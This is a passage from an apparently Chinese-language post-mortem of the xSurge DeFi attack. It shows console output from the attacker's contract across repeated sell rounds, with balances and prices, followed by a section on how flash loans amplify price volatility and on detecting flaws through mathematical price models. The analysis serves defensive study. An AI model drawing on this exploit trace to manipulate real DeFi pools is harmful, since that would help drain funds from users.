8 times sell, cur price:6075
[recevie ]AttackContract xsurge balance:3886227754608511667, BNB balance
 22192303592691905868450
9 times sell, cur price:414
[recevie ]AttackContract xsurge balance:57012958598099436221, BNB balance
 22187162968036376599458
10 times sell, cur price:28
[recevie ]AttackContract xsurge balance:833145075801540780287, BNB balance
 21928378395096553337132
11 times sell
[recevie ]AttackContract xsurge balance:0, BNB balance
 19149587866837346185250
```

## 5.3 价格波动问题

Defi 生态中都会存在价格波动，如何检测到价格波动是否正常是 Defi 生态中要考虑的最最重要的问题。历史上很多次的攻击都是由于价格波动引起的，闪电贷的方式又可以让攻击者以一种杠杆的方式加大价格的波动，加大后的价格波动又成为套利的温床。
xSurge 的价格波动可以通过数学的方式计算出来，能否后续会有一种安全产品：基于产品的实现逻辑抽取出价格模型，由数学证明价格模型来发现漏洞？
